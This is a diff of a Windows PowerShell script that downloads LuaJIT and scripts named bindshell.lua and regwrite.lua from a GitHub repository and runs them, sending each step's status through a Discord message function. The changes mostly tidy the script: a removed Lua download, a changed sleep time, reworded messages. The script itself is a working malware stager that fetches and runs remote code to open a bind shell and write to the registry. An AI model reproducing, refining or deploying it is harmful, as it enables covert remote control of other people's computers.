@@ -1,7 +1,5 @@
 # Define paths and URLs
 $baseDir = "$env:TEMP\ZZ"
-$luaZip = "$baseDir\lua-5.4.2_Win64_bin.zip"
-$luaZipUrl = "https://sourceforge.net/projects/luabinaries/files/5.4.2/Tools%20Executables/lua-5.4.2_Win64_bin.zip/download"
 $luaJitZip = "$baseDir\LuaJIT-2.1.zip"
 $luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"
 $bindshellScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.lua"
@@ -71,7 +69,7 @@ function Get-File {
 # Function to wait for a minute
 function Wait-ForMinute {
     Send-DiscordMessage -message "Waiting for 10 seconds before next step..."
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 10
 }
 
 # Function to copy files with wait and notification
@@ -175,36 +173,6 @@ if (-not (Test-Path $baseDir)) {
 # Get LuaJIT if not already done
 Get-And-Extract-LuaJIT
 
-# Download and extract Lua if not already done
-if (-not (Test-Path "$baseDir\lua54.exe")) {
-    $message = "Getting Lua ZIP file..."
-    Send-DiscordMessage -message $message
-    # Get the ZIP file
-    if (-not (Test-Path $luaZip)) {
-        Get-File -url $luaZipUrl -destination $luaZip
-        Wait-ForMinute
-
-        # Wait for the download to complete
-        Wait-ForFile -FilePath $luaZip
-    }
-
-    $message = "Extracting Lua ZIP file..."
-    Send-DiscordMessage -message $message
-    # Extract the ZIP file
-    try {
-        Expand-Archive -Path $luaZip -DestinationPath $baseDir
-        $message = "Extraction completed to: $baseDir"
-        Send-DiscordMessage -message $message
-    } catch {
-        $message = "Error extracting Lua ZIP file: $(${_})"
-        Send-DiscordMessage -message $message
-        exit 1
-    }
-} else {
-    $message = "Lua executable already exists: $baseDir\lua54.exe"
-    Send-DiscordMessage -message $message
-}
-
 # Create the Luapath directory and subdirectories if they don't exist
 if (-not (Test-Path -Path $luaPathDir)) {
     New-Item -Path $luaPathDir -ItemType Directory -Force
@@ -251,7 +219,7 @@ if (Test-Path -Path "$luaJitPath\src\lua51.dll") {
 
 Wait-ForMinute
 
-# Download Lua scripts and cmd file
+# Download Lua scripts
 $scriptUrls = @{
     "bindshell.lua" = $bindshellScriptUrl
     "regwrite.lua" = $regwriteScriptUrl
@@ -269,14 +237,14 @@ foreach ($script in $scriptUrls.Keys) {
     }
 }
 
-# Execute the Lua scripts and cmd file
+# Execute the Lua scripts
 try {
-    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$regwriteScriptPath" -NoNewWindow -Wait
-    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$bindshellScriptPath" -NoNewWindow -Wait
-    $message = "Lua scripts file executed successfully."
+    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList $regwriteScriptPath -NoNewWindow -Wait
+    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList $bindshellScriptPath -NoNewWindow -Wait
+    $message = "Lua scripts executed successfully."
     Send-DiscordMessage -message $message
 } catch {
-    $message = "Error executing scripts file: $(${_})"
+    $message = "Error executing Lua scripts: $(${_})"
     Send-DiscordMessage -message $message
     Wait-ForMinute
     pause
